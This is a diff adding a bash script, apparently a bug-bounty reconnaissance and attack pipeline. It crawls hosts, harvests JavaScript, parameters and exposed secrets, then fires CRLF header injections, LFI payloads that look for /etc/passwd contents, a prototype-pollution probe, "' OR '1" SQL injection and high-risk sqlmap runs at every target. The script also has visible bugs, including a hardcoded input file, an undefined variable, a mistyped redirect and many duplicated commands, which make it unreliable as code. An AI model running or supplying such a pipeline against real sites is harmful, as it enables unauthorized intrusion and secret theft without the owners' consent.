@@ -1,0 +1,284 @@
+#!/bin/bash
+RED='\033[0;31m';
+GREEN='\033[0;32m';
+YELLOW='\033[1;33m';
+BLUE='\033[0;34m';
+NC='\033[0m';
+PURPLE='\033[01;35m';
+CYAN='\033[01;36m';
+WHITE='\033[01;37m';
+BOLD='\033[1m';
+UNDERLINE='\033[4m';
+
+echo -e "${YELLOW}
+    _ __ ___  ___ ___  _ __ (_) |_ __ _ | | |
+   | '__/ _ \/ __/ _ \| '_ \| | __/ _ | | |
+   | | |  __/ (_| (_) | | | | | || (_|| | | |
+   |_|  \___|\___\___/|_| |_|_|\__\__,| |_|_|
+				                                                                     
+   ${GREEN}@winteriscoming${NC}";
+
+while getopts ":f:" input;do
+        case "$input" in
+                f) file=${OPTARG}
+                        ;;
+                esac
+        done
+if [ -z "$file" ]
+        then
+                echo "Please give a file like \"-f alive.txt\""
+                exit 1
+fi
+
+mkdir reconitall 2>/dev/null;
+echo "";
+echo -ne "${RED}${BOLD}Fetching All The Links: ";
+if [ ! -s "reconitall/urls.txt" ]
+	then
+		cat alive.txt | fatl 2>/dev/null | anew reconitall/urls.txt 1>/dev/null;
+fi
+echo -e "${YELLOW}$(wc -l reconitall/urls.txt | cut -d' ' -f1) URL was found${NC}";
+
+#echo "";
+echo -ne "${RED}${BOLD}Probing The URLS: ";
+if [ ! -s "reconitall/alive-urls.txt" ]
+	then
+		cat reconitall/urls.txt | httpx	-t 100 -silent | anew reconitall/alive-urls.txt 1>/dev/null;
+		cat reconitall/urls.txt | httpx -t 100 -silent | anew reconitall/alive-urls.txt 1>/dev/null;
+		cat reconitall/urls.txt | httpx -t 100 -silent | anew reconitall/alive-urls.txt 1>/dev/null;
+		cat reconitall/urls.txt | httpx -t 100 -silent | anew reconitall/alive-urls.txt 1>/dev/null;
+		cat reconitall/urls.txt | httpx -t 100 -silent | anew reconitall/alive-urls.txt 1>/dev/null;
+fi
+echo -e "${YELLOW}$(wc -l reconitall/alive-urls.txt | cut -d' ' -f1) alive URL found${NC}";
+
+#echo "";
+echo -ne "${RED}${BOLD}Filtering The URLS: ";
+if [ ! -s "reconitall/uro.txt" ]
+	then
+		cat reconitall/alive-urls.txt | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico)" | uro | anew reconitall/uro.txt 1>/dev/null 2>/dev/null;
+fi
+echo -e "${YELLOW}$(wc -l reconitall/uro.txt | cut -d' ' -f1) filtered URL${NC}";
+
+#echo "";
+echo -ne "${RED}${BOLD}Extracting Different GF Patterns: ";
+cat reconitall/uro.txt | gf xss | anew xss.txt 1>/dev/null;
+cat reconitall/uro.txt | gf sqli | anew sqli.txt 1>/dev/null;
+cat reconitall/uro.txt | gf lfi | anew lfi.txt 1>/dev/null;
+cat reconitall/uro.txt | gf ssrf | anew ssrf.txt 1>/dev/null;
+cat reconitall/uro.txt | gf redirect | anew redirect.txt 1>/dev/null;
+echo -e "${YELLOW}Done${NC}";
+mkdir reconitall/gf 2>/dev/null;
+mv xss.txt sqli.txt lfi.txt ssrf.txt redirect.txt reconitall/gf/;
+
+#echo "";
+mkdir reconitall/extensions 2>/dev/null;
+echo -ne "${RED}${BOLD}Extracting Different File Extensions: ";
+cat reconitall/alive-urls.txt | grep -E '\.zip\??' 2>/dev/null | anew zip.txt 1>/dev/null;
+cat reconitall/alive-urls.txt | grep -E '\.rar\??' 2>/dev/null | anew rar.txt 1>/dev/null;
+cat reconitall/alive-urls.txt | grep -E '\.gzip\??' 2>/dev/null | anew gzip.txt 1>/dev/null;
+cat reconitall/alive-urls.txt | grep -E '\.tar\.gz\??' 2>/dev/null | anew tar.gz.txt 1>/dev/null;
+cat reconitall/alive-urls.txt | grep -E '\.log\??' 2>/dev/null | anew log.txt 1>/dev/null;
+cat reconitall/alive-urls.txt | grep -E '\.bak\??' 2>/dev/null | anew bak.txt 1>/dev/null;
+cat reconitall/alive-urls.txt | grep -E '\.sql\??' 2>/dev/null | anew sql.txt 1>/dev/null;
+cat reconitall/alive-urls.txt | grep -E '\.txt\??' 2>/dev/null | anew txt.txt 1>/dev/null;
+cat reconitall/alive-urls.txt | grep -E '\.svg\??' 2>/dev/null | anew svg.txt 1>/dev/null;
+cat reconitall/alive-urls.txt | grep -E '\.md\??' 2>/dev/null | anew md.txt 1>/dev/null;
+cat reconitall/alive-urls.txt | grep -E '\.json\??' 2>/dev/null | anew json.txt 1>/dev/null;
+cat reconitall/alive-urls.txt | grep -E '\.php\??' 2>/dev/null | anew php.txt 1>/dev/null;
+cat reconitall/alive-urls.txt | grep -E '\.html\??' 2>/dev/null | anew html.txt 1>/dev/null;
+cat reconitall/alive-urls.txt | grep -E '\.aspx\??' 2>/dev/null | anew aspx.txt 1>/dev/null;
+cat reconitall/alive-urls.txt | grep -E '\.asp\??' 2>/dev/null | anew asp.txt 1>/dev/null;
+cat reconitall/alive-urls.txt | grep -E '\.yaml\??' 2>/dev/null | anew yaml.txt 1>/dev/null;
+cat reconitall/alive-urls.txt | grep -E '\.jsp\??' 2>/dev/null | anew jsp.txt 1>/dev/null;
+cat reconitall/alive-urls.txt | grep -E '\.xls\??' 2>/dev/null | anew xls.txt 1>/dev/null;
+cat reconitall/alive-urls.txt | grep -E '\.xlsx\??' 2>/dev/null | anew xlsx.txt 1>/dev/null;
+cat reconitall/alive-urls.txt | grep -E '\.pdf\??' 2>/dev/null | anew pdf.txt 1>/dev/null;
+cat reconitall/alive-urls.txt | grep -E '\.docx\??' 2>/dev/null | anew docx.txt 1>/dev/null;
+cat reconitall/alive-urls.txt | grep -E '\.doc\??' 2>/dev/null | anew doc.txt 1>/dev/null;
+cat reconitall/alive-urls.txt | grep -E '\.yml\??' 2>/dev/null | anew yml.txt 1>/dev/null;
+echo -e "${YELLOW}Done${NC}";
+mv zip.txt rar.txt gzip.txt tar.gz.txt log.txt bak.txt sql.txt txt.txt svg.txt md.txt json.txt php.txt html.txt aspx.txt asp.txt yaml.txt jsp.txt xls.txt xlsx.txt pdf.txt docx.txt doc.txt yml.txt reconitall/extensions/ 2>/dev/null;
+
+#echo "";
+echo -ne "${RED}${BOLD}Fetching Javascript Files From Alive Domains: ";
+if [ ! -s "reconitall/js-domains.txt" ]
+	then
+		cat alive.txt | getJS --complete 2>/dev/null| anew reconitall/js-domains.txt 1>/dev/null;
+		cat alive.txt | getJS --complete 2>/dev/null| anew reconitall/js-domains.txt 1>/dev/null;
+		cat alive.txt | getJS --complete 2>/dev/null| anew reconitall/js-domains.txt 1>/dev/null;
+		cat alive.txt | getJS --complete 2>/dev/null| anew reconitall/js-domains.txt 1>/dev/null;
+		cat alive.txt | getJS --complete 2>/dev/null| anew reconitall/js-domains.txt 1>/dev/null;
+		subjs -i alive.txt 2>/dev/null | anew reconitall/js-domains.txt 1>/dev/null;
+		subjs -i alive.txt 2>/dev/null | anew reconitall/js-domains.txt 1>/dev/null;
+		subjs -i alive.txt 2>/dev/null | anew reconitall/js-domains.txt 1>/dev/null;
+		subjs -i alive.txt 2>/dev/null | anew reconitall/js-domains.txt 1>/dev/null;
+		subjs -i alive.txt 2>/dev/null | anew reconitall/js-domains.txt 1>/dev/null;
+		cat reconitall/urls.txt | grep -E '\.js\??' | grep -v '\.jsp' | anew reconitall/js-domains.txt 1>/dev/null;
+fi
+echo -e "${YELLOW}$(wc -l reconitall/js-domains.txt | cut -d' ' -f1) Javascript file was found${NC}";
+
+#echo "";
+echo -ne "${RED}${BOLD}Fetching Javascript Files From Alive Endpoints: ";
+if [ ! -s "reconitall/js-endpoints.txt" ]
+	then
+		cat reconitall/uro.txt | getJS --complete 2>/dev/null| anew reconitall/js-endpoints.txt 1>/dev/null;
+		cat reconitall/uro.txt | getJS --complete 2>/dev/null| anew reconitall/js-endpoints.txt 1>/dev/null;
+		cat reconitall/uro.txt | getJS --complete 2>/dev/null| anew reconitall/js-endpoints.txt 1>/dev/null;
+		cat reconitall/uro.txt | getJS --complete 2>/dev/null| anew reconitall/js-endpoints.txt 1>/dev/null;
+		cat reconitall/uro.txt | getJS --complete 2>/dev/null| anew reconitall/js-endpoints.txt 1>/dev/null;
+		subjs -i reconitall/uro.txt 2>/dev/null | anew reconitall/js-endpoints.txt 1>/dev/null;
+		subjs -i reconitall/uro.txt 2>/dev/null | anew reconitall/js-endpoints.txt 1>/dev/null;
+		subjs -i reconitall/uro.txt 2>/dev/null | anew reconitall/js-endpoints.txt 1>/dev/null;
+		subjs -i reconitall/uro.txt 2>/dev/null | anew reconitall/js-endpoints.txt 1>/dev/null;
+		subjs -i reconitall/uro.txt 2>/dev/null | anew reconitall/js-endpoints.txt 1>/dev/null;
+		cat reconitall/urls.txt | grep -E '\.js\??' | grep -v '\.jsp' | anew reconitall/js-endpoint.txt 1>/dev/null;
+fi
+echo -e "${YELLOW}$(wc -l reconitall/js-endpoints.txt | cut -d' ' -f1) Javascript file was found${NC}";
+
+cat reconitall/js-domains.txt reconitall/js-endpoints.txt | anew reconitall/js.txt 1>/dev/null;
+echo -ne "${RED}${BOLD}Filtering All The Javascript Files: ${YELLOW}$(wc -l reconitall/js.txt | cut -d' ' -f1)\n${NC}";
+
+#echo "";
+echo -ne "${RED}${BOLD}Running Nuclei Templates (Background Process): ${YELLOW}Running..\n${NC}";
+if [ ! -s "reconitall/info.txt" ]
+	then
+		(cat alive.txt | nuclei -silent -severity info,low,medium,high,critical | anew reconitall/info.txt 1>/dev/null 2>/dev/null) &>/dev/null;
+fi
+
+#echo "";
+echo -ne "${RED}${BOLD}Running Tokens Templates On The Javascript Files (Background Process): ${YELLOW}Running..\n${NC}";
+if [ ! -s "reconitall/tokens.txt" ]
+	then
+		(cat reconitall/js.txt reconitall/uro.txt | nuclei -silent -t ~/nuclei-templates/exposures/tokens 2>/dev/null | anew reconitall/tokens.txt 1>/dev/null) &>/dev/null;
+fi
+
+#echo "";
+mkdir reconitall/linkfinder 2>/dev/null;
+echo -ne "${RED}${BOLD}Running Linkfinder On All The Endpoints: ";
+for url in $(cat reconitall/uro.txt); do python3 -W ignore /opt/LinkFinder/linkfinder.py -i $url -o cli 2>/dev/null | grep -va 'linkfinder.py' | grep -v 'sslcontext' | anew reconitall/linkfinder/$(echo $url | unfurl format %d).txt 1>/dev/null 2>/dev/null; done; 
+for url in $(cat reconitall/uro.txt); do python3 -W ignore /opt/LinkFinder/linkfinder.py -i $url -o cli 2>/dev/null | grep -va 'linkfinder.py' | grep -v 'sslcontext' | anew reconitall/linkfinder/$(echo $url | unfurl format %d).txt 1>/dev/null 2>/dev/null; done;
+for url in $(cat reconitall/uro.txt); do python3 -W ignore /opt/LinkFinder/linkfinder.py -i $url -o cli 2>/dev/null | grep -va 'linkfinder.py' | grep -v 'sslcontext' | anew reconitall/linkfinder/$(echo $url | unfurl format %d).txt 1>/dev/null 2>/dev/null; done;
+echo -e "${YELLOW}Done${NC}";
+
+#echo "";
+echo -ne "${RED}${BOLD}Running Linkfinder On The Javascript Files: ";
+for url in $(cat reconitall/js.txt); do python3 -W ignore /opt/LinkFinder/linkfinder.py -i $url -o cli 2>/dev/null | grep -va 'linkfinder.py' | grep -v 'sslcontext' | anew reconitall/linkfinder/$(echo $url | unfurl format %d).txt 1>/dev/null 2>/dev/null; done; 
+for url in $(cat reconitall/js.txt); do python3 -W ignore /opt/LinkFinder/linkfinder.py -i $url -o cli 2>/dev/null | grep -va 'linkfinder.py' | grep -v 'sslcontext' | anew reconitall/linkfinder/$(echo $url | unfurl format %d).txt 1>/dev/null 2>/dev/null; done;
+for url in $(cat reconitall/js.txt); do python3 -W ignore /opt/LinkFinder/linkfinder.py -i $url -o cli 2>/dev/null | grep -va 'linkfinder.py' | grep -v 'sslcontext' | anew reconitall/linkfinder/$(echo $url | unfurl format %d).txt 1>/dev/null 2>/dev/null; done;
+echo -e "${YELLOW}Done${NC}";
+
+#echo "";
+echo -ne "${RED}${BOLD}Running Secret Finder On All The Endpoints: ";
+python3 /opt/SecretFinder/SecretFinder.py -i reconitall/uro.txt -o cli 2>/dev/null | anew reconitall/secretfinder-urls.txt 1>/dev/null;
+python3 /opt/SecretFinder/SecretFinder.py -i reconitall/uro.txt -o cli 2>/dev/null | anew reconitall/secretfinder-urls.txt 1>/dev/null;
+python3 /opt/SecretFinder/SecretFinder.py -i reconitall/uro.txt -o cli 2>/dev/null | anew reconitall/secretfinder-urls.txt 1>/dev/null;
+python3 /opt/SecretFinder/SecretFinder.py -i reconitall/uro.txt -o cli 2>/dev/null | anew reconitall/secretfinder-urls.txt 1>/dev/null;
+echo -e "${YELLOW}$(wc -l reconitall/secretfinder-urls.txt | cut -d' ' -f1) Secret was found!${NC}";
+
+#echo "";
+echo -ne "${RED}${BOLD}Running Secret Finder On Javascript Files: ";
+python3 /opt/SecretFinder/SecretFinder.py -i reconitall/js.txt -o cli 2>/dev/null | anew reconitall/secretfinder-js.txt 1>/dev/null;
+python3 /opt/SecretFinder/SecretFinder.py -i reconitall/js.txt -o cli 2>/dev/null | anew reconitall/secretfinder-js.txt 1>/dev/null;
+python3 /opt/SecretFinder/SecretFinder.py -i reconitall/js.txt -o cli 2>/dev/null | anew reconitall/secretfinder-js.txt 1>/dev/null;
+python3 /opt/SecretFinder/SecretFinder.py -i reconitall/js.txt -o cli 2>/dev/null | anew reconitall/secretfinder-js.txt 1>/dev/null;
+echo -e "${YELLOW}$(wc -l reconitall/secretfinder-js.txt | cut -d' ' -f1) Secret was found!${NC}";
+
+#echo "";
+echo -ne "${RED}${BOLD}Getting All The Parameters: ";
+for host in $(cat alive.txt); do python3 /opt/ParamSpider/paramspider.py -d $host --subs true -q 2>/dev/null | anew reconitall/params.txt 1>/dev/null; done;
+cat reconitall/params.txt | grep -v ' ' | httpx -silent | anew alive-params.txt 1>/dev/null;
+cat reconitall/params.txt | grep -v ' ' | httpx -silent | anew alive-params.txt 1>/dev/null;
+cat reconitall/params.txt | grep -v ' ' | httpx -silent | anew alive-params.txt 1>/dev/null;
+cat reconitall/uro.txt | grep '=' | anew alive-params.txt 1>/dev/null;
+mv alive-params.txt reconitall/;
+cat reconitall/alive-params.txt | gf xss | anew reconitall/gf/xss.txt 1>/dev/null;
+cat reconitall/alive-params.txt | gf sqli | anew reconitall/gf/sqli.txt 1>/dev/null;
+cat reconitall/alive-params.txt | gf lfi | anew reconitall/gf/lfi.txt 1>/dev/null;
+cat reconitall/alive-params.txt | gf ssrf | anew reconitall/gf/ssrf.txt 1>/dev/null;
+cat reconitall/alive-params.txt | gf redirect | anew reconitall/gf/redirect.txt 1>/dev/null;
+echo -e "${YELLOW}Done${NC}";
+
+#echo "";
+echo -ne "${RED}${BOLD}Filtering Reflected Parameters: ";
+mkdir reconitall/xss 2>/dev/null;
+if [ ! -s "reconitall/xss/gxss.txt" ]
+	then
+		cat reconitall/alive-params.txt | Gxss | anew reconitall/xss/gxss.txt 1>/dev/null;
+		cat reconitall/alive-params.txt | Gxss | anew reconitall/xss/gxss.txt 1>/dev/null;
+fi
+echo -e "${YELLOW}$(wc -l reconitall/xss/gxss.txt | cut -d' ' -f1) URL with reflected parameters were found!!${NC}";
+
+#echo "";
+echo -ne "${RED}${BOLD}Identifying allowed characters with kxss: ";
+if [ ! -s "reconitall/xss/kxss.txt" ]
+	then
+		cat reconitall/alive-params.txt | kxss | anew reconitall/xss/kxss.txt 1>/dev/null;
+		cat reconitall/alive-params.txt | kxss | anew reconitall/xss/kxss.txt 1>/dev/null;
+fi
+echo -e "${YELLOW}Done${NC}";
+
+###################################################################################################################
+###################################################################################################################
+#echo "";
+echo -ne "${RED}${BOLD}Scanning For XSS with XSSNOW Framework: ";
+xssnow | anew reconitall/xssnow.txt;
+
+#echo "";
+###################################################################################################################
+###################################################################################################################
+echo -ne "${RED}${BOLD}Scanning For Open Redirects: ";
+cat alive.txt | unfurl format %d | sort -u | anew open-redirect-whitelist.txt 1>/dev/null;
+for whitelist in $(cat open-redirect-whitelist.txt); do sed 's/whitelist/$whitelist/g' ~/bugbounty/wordlists/payloads/open-redirect.txt | anew payloads.txt 1>/dev/null; python3 /opt/Oralyzer/oralyzer.py -l reconitall/gf/redirect.txt -p payloads.txt | grep -vE '^ ' | anew oralyzer.txt 1>/dev/null; python3 /opt/OpenRedireX/openredirex.py -l reconitall/gf/redirect.txt -p payloads.txt 2>/dev/null | tail -n +16 | grep -v 'Total Execution' | anew open-redirex.txt 1>/dev/null; done;
+mkdir reconitall/open-redirect 2>/dev/null;
+mv oralyzer.txt open-redirex.txt reconitall/open-redirect/;
+cat reconitall/open-redirect/open-redirex.txt 2>/dev/null | anew reconitall/open-redirect/open-redirect.txt 1>/dev/null;
+cat reconitall/open-redirect/oralyzer.txt 2>/dev/null | anew reconitall/open-redirect/open-redirect.txt 1>/dev/null;
+echo -e "${YELLOW}$(wc -l reconitall/open-redirect/open-redirect.txt | cut -d' ' -f1) Open Redirect was found! (Oralyzer: $(wc -l reconitall/open-redirect/oralyzer.txt), Open-Redirex: $(wc -l reconitall/open-redirect/open-redirex.txt)${NC}";
+###################################################################################################################
+###################################################################################################################
+#echo "";
+echo -ne "${RED}${BOLD}Scanning for CORS: ";
+python3 /opt/Corsy/corsy.py -i alive.txt 2>/dev/null | anew cors.txt 1>/dev/null 2>/dev/null;
+mv cors.txt reconitall/;
+echo -e "${YELLOW}$(cat reconitall/cors.txt | grep high | cut -d' ' -f1 | sort -u | wc -l) Exploitable CORS was found!${NC}";
+
+###################################################################################################################
+###################################################################################################################
+echo -ne "${RED}${BOLD}Scanning for CRLF Injection: ";
+mkdir reconitall/crlf 2>/dev/null;
+cat reconitall/alive-params.txt | qsreplace "%0d%0acrlf:crlf" | rush -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi' | anew reconitall/crlf-oneliner1.txt 1>/dev/null;
+cat reconitall/alive-params.txt | qsreplace "%E5%98%8D%E5%98%8Acrlf:crlf" | rush -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi' | anew reconitall/crlf-oneliner1.txt 1>/dev/null
+cat reconitall/uro.txt | rush -j40 'if curl -Iks -m 10 "{}" -H "CF-Connecting_IP: %0d%0acrlf:crlf" -H "From: root@%0d%0acrlf:crlf" -H "Client-IP: %0d%0acrlf:crlf" -H "X-Client-IP: %0d%0acrlf:crlf" -H "X-Forwarded-For: %0d%0acrlf:crlf" -H "X-Wap-Profile: %0d%0acrlf:crlf" -H "Forwarded: %0d%0acrlf:crlf" -H "True-Client-IP: %0d%0acrlf:crlf" -H "Contact: root@%0d%0acrlf:crlf" -H "X-Originating-IP: %0d%0acrlf:crlf" -H "X-Real-IP: %0d%0acrlf:crlf" | grep -q "^crlf:crlf" || curl -Iks -m 10 "$line" -H "CF-Connecting_IP: %E5%98%8D%E5%98%8Acrlf:crlf" -H "From: root@%E5%98%8D%E5%98%8Acrlf:crlf" -H "Client-IP: %E5%98%8D%E5%98%8Acrlf:crlf" -H "X-Client-IP: %E5%98%8D%E5%98%8Acrlf:crlf" -H "X-Forwarded-For: %E5%98%8D%E5%98%8Acrlf:crlf" -H "X-Wap-Profile: %E5%98%8D%E5%98%8Acrlf:crlf" -H "Forwarded: %E5%98%8D%E5%98%8Acrlf:crlf" -H "True-Client-IP: %E5%98%8D%E5%98%8Acrlf:crlf" -H "Contact: root@%E5%98%8D%E5%98%8Acrlf:crlf" -H "X-Originating-IP: %E5%98%8D%E5%98%8Acrlf:crlf" -H "X-Real-IP: %E5%98%8D%E5%98%8Acrlf:crlf" | grep -q "^crlf:crlf" || curl -Iks -m 10 "$line" -H "CF-Connecting_IP: %0D%0Acrlf:crlf" -H "From: root@%0D%0Acrlf:crlf" -H "Client-IP: %0D%0Acrlf:crlf" -H "X-Client-IP: %0D%0Acrlf:crlf" -H "X-Forwarded-For: %0D%0Acrlf:crlf" -H "X-Wap-Profile: %0D%0Acrlf:crlf" -H "Forwarded: %0D%0Acrlf:crlf" -H "True-Client-IP: %0D%0Acrlf:crlf" -H "Contact: root@%0D%0Acrlf:crlf" -H "X-Originating-IP: %0D%0Acrlf:crlf" -H "X-Real-IP: %0D%0Acrlf:crlf" 2>dev/null | grep -q "^crlf:crlf"; then echo "The URL {} with vulnerable header may be vulnerable to CRLF Injection. Check Manually";fi' | anew reconitall/crlf-oneliner1.txt 1>/dev/null;
+crlfuzz -l reconitall/uro.txt -s | anew reconitall/crlf/crlfuzz.txt 1>/dev/null;
+echo -e "${YELLOW}$(wc -l reconitall/crlf/crlfuzz.txt | cut -d' ' -f1) CRLF Injecection was found!${NC}"
+###################################################################################################################
+###################################################################################################################
+echo -ne "${RED}${BOLD}Scanning For LFI: ";
+mkdir reconitall/lfi/ 2>/dev/null;
+for payload in $(cat ~/bugbounty/wordlists/payloads/lfi.txt); do cat reconitall/gf/lfi.txt | qsreplaceBetter "$payload" | httpx -nc -silent -mr "root:x" -t 50 | anew reconitall/lfi/lfi-linux.txt;done
+for payload in $(cat ~/bugbounty/wordlists/payloads/lfi-linux.txt); do cat reconitall/gf/lfi.txt | qsreplaceBetter "$payload" | httpx -silent -mr "root:x" -t 50 -maxhr 99999999999999999 2>/dev/null | anew reconitall/lfi/lfi-linux.txt;done
+for payload in $(cat ~/bugbounty/wordlists/payloads/lfi-windows.txt); do cat reconitall/gf/lfi.txt | qsreplaceBetter "$payload" | httpx -silent -mr "boot loader" -t 50 -maxhr 99999999999999999 2>/dev/null | anew reconitall/lfi/lfi-windows.txt;done
+cat reconitall/lfi/* | anew reconitall/lfi/all.txt 1>/dev/null;
+echo -e "${YELLOW}$(wc -l reconitall/lfi/all.txt | cut -d' ' -f1) LFI found!${NC}";
+
+###################################################################################################################
+###################################################################################################################
+echo -ne "${RED}${BOLD}Scanning For Prototype Pollution: ";
+mkdir reconitall/ptp/ 2>/dev/null;
+cat alive.txt | sed 's/$/\/?__proto__[testparam]=exploit\//' | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' 2>/dev/null | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE" | anew reconitall/ptp/oneliner.txt 1>/dev/null;
+echo -e "${YELLOW}$(wc -l reconitall/ptp/oneliner.txt | cut -d' ' -f1) Prototype Pollution found!${NC}";
+###################################################################################################################
+###################################################################################################################
+mkdir reconitall/sqli 2>/dev/null;
+echo -ne "${RED}${BOLD}Running HTTPX Sqli One Liner: ";
+cat reconitall/gf/sqli.txt | qsreplaceBetter "' OR '1" | httpx -silent -store-response-dir reconitall/sqli/output -threads 50 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" | anew reconitall/sqli/httpx-oneliner.txt;
+cat reconitall/gf/sqli.txt | qsreplaceBetter "' OR '1" | httpx -silent -store-response-dir reconitall/sqli/output -threads 50 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" | anew reconitall/sqli/httpx-oneliner.txt;
+cat reconitall/gf/sqli.txt | qsreplaceBetter "' OR '1" | httpx -silent -store-response-dir reconitall/sqli/output -threads 50 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" | anew reconitall/sqli/httpx-oneliner.txt;
+cat reconitall/gf/sqli.txt | qsreplaceBetter "' OR '1" | httpx -silent -store-response-dir reconitall/sqli/output -threads 50 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" | anew reconitall/sqli/httpx-oneliner.txt;
+cat reconitall/gf/sqli.txt | qsreplaceBetter "' OR '1" | httpx -silent -store-response-dir reconitall/sqli/output -threads 50 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" | anew reconitall/sqli/httpx-oneliner.txt;
+cat reconitall/alive-params.txt | qsreplaceBetter "' OR '1" | httpx -silent -store-response-dir reconitall/sqli/output -threads 50 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" | anew reconitall/sqli/httpx-oneliner.txt;
+cat reconitall/alive-params.txt | qsreplaceBetter "' OR '1" | httpx -silent -store-response-dir reconitall/sqli/output -threads 50 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" | anew reconitall/sqli/httpx-oneliner.txt;
+
+echo -ne "${RED}${BOLD}Scanning for SQL Injection with SQLMAP (In the background): ";
+python3 /opt/sqlmap-dev/sqlmap.py -m reconitall/gf/sqli.txt --batch --random-agent --level 3 --risk 3 --dbms 2>/dev/null | grep -vi 'testing' | anew reconitall/sqli/sqlmap.txt 1>/dev/null &>/dev/null;
+echo "";
